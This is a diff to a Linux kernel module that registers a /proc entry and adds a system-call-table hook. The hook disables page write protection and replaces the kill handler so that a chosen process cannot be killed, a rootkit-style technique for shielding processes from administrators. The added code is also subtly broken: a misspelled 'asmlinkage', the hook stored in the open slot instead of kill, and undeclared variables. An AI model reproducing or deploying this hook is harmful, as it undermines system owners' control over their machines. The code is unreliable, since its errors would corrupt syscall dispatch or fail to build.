@@ -10,6 +10,14 @@ char m_name[128] = { 0x0, } ;
 static
 int m_num=0;
 
+asmlinkage int (*orig_sys_kill)(pid_t pid, int signal);
+
+asmiinkage int m_sys_kill(pid_t pid, int signal) {
+	if(m_num == (int) pid)
+		return -1;
+	return orig_sys_kill(pid,signal);
+}
+
 static 
 int m_open(struct inode *inode, struct file *file) {
 	return 0 ;
@@ -81,12 +89,25 @@ static const struct file_operations m_fops = {
 static 
 int __init m_init(void) {
 	proc_create("mexe", S_IRUGO | S_IWUGO, NULL, &m_fops) ;
+
+	orig_sys_kill = sctable[__NR_kill];
+	pte = lookup_address((unsigned long) sctable, &level);
+	if(pte->pte &~ _PAGE_RW)
+		pte->pte |= _PAGE_RW;
+	sctable[__NR_open] = m_sys_kill;
+
 	return 0;
 }
 
 static 
 void __exit m_exit(void) {
+	unsigned int level;
+	pte_t* pte;
 	remove_proc_entry("mexe", NULL) ;
+
+	sctable[__NR_kill] = orig_sys_kill;
+	pte = lookup_address((unsigned long) sctable, &level);
+	pte->pte = pte->pte &~ _PAGE_RW;
 }
 
 
